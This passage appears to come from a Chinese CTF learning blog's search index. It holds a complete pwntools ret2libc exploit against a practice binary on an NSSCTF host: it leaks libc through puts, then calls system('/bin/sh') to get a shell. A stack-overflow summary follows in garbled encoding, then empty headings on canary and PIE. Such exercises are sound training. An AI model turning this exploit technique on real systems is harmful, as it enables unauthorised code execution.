class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.anna.nssctf.cn&quot;</span>, <span class="number">28222</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x40117e</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"><span class="comment">#leak libc_base</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">ru(<span class="string">b&#x27;Go Go Go!!!\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">libc = get_libc(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(ret) + p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">ru(<span class="string">b&#x27;Go Go Go!!!\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p><strong>æ ˆæº¢å‡ºå°ç»“ï¼šæ ˆæº¢å‡ºæ˜¯ä¸ºäº†è¦†å†™æŸäº›æ•°æ®æ¥è¾¾åˆ°æ”»å‡»è€…ç›®çš„çš„ä¸€ç§æ‰‹æ®µï¼Œä¸èƒ½åªæ˜¯ç®€å•çš„èƒŒäº†ä»€ä¹ˆret2textï¼Œret2libcç­‰é¢˜å‹æ¨¡æ¿ï¼Œæ›´é‡è¦çš„æ˜¯ç†è§£è¿™ç§æ‰‹æ®µã€‚è€Œä¸”æº¢å‡ºä¸åªæ˜¯scanfï¼Œreadï¼Œgetsè¿™äº›ï¼Œstrcpyä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºæœ¬è´¨ä¸Šéƒ½æ˜¯ç”±ä¸€ä¸ªç¼“å†²åŒºå¤åˆ¶åˆ°å¦ä¸€ä¸ªç¼“å†²åŒºã€‚å¦å¤–è¦†å†™çš„æ•°æ®ä¹Ÿä¸å°½å°±æ˜¯è¿”å›åœ°å€äº†ï¼Œåƒåˆšæ‰åœ¨è¦†ç›–åˆ°retä¹‹å‰é¡ºä¾¿è¦†ç›–äº†ä¸€ä¸ªintå˜é‡ï¼Œåœ¨è¿™é‡Œæ²¡çœ‹åˆ°ä»€ä¹ˆä½œç”¨ï¼Œä½†æ˜¯å‡å¦‚æ˜¯ä¸€ä¸ªå…³é”®æ•°æ®ï¼ˆæ¯”å¦‚ä¸€ä¸ªéšæœºæ•°ï¼‰ï¼Œå°±å¯ä»¥èµ·åˆ°å¾ˆå¤§ç”¨å¤„äº†ã€‚</strong></p><h2 id="ELFæ–‡ä»¶ä¿æŠ¤æœºåˆ¶åŠåŸºæœ¬ç»•è¿‡æ‰‹æ³•"><a href="#ELFæ–‡ä»¶ä¿æŠ¤æœºåˆ¶åŠåŸºæœ¬ç»•è¿‡æ‰‹æ³•" class="headerlink" title="ELFæ–‡ä»¶ä¿æŠ¤æœºåˆ¶åŠåŸºæœ¬ç»•è¿‡æ‰‹æ³•"></a>ELFæ–‡ä»¶ä¿æŠ¤æœºåˆ¶åŠåŸºæœ¬ç»•è¿‡æ‰‹æ³•</h2><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
